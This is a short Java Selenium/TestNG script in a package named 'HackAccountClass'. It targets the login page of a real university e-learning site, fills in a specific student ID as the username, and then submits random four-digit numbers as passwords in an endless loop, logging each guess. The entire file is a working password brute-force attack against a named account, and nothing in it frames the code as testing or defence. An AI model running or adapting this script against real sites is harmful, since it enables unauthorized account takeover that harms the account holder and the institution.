package HackAccountClass;

import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.interactions.Actions;
import org.testng.annotations.Test;

import java.util.Set;
import java.util.TreeSet;

public class testtt0 extends Login {
    @Test
    public void hack0() throws InterruptedException {
        driver.get("https://elearning.nkust.edu.tw/mooc/login.php");
        Actions act = new Actions(driver);
        driver.findElement(By.xpath("//input[@id='username']")).sendKeys("C109151120");


        Set<Integer> password = new TreeSet<>();
        while(true)
        {
            int a = (int) (Math.random() * (2000 - 1000 + 1)) + 1000;

            if(password.contains(a))
            {
                continue;
            }
            else {
                String base = a + "";
                driver.findElement(By.xpath("//input[@id='password']")).sendKeys(base);
                driver.findElement(By.xpath("//input[@id='password']")).sendKeys(Keys.ENTER);
                Thread.sleep(1000);
                password.add(a);
                System.out.println(a);
            }

        }









    }
}
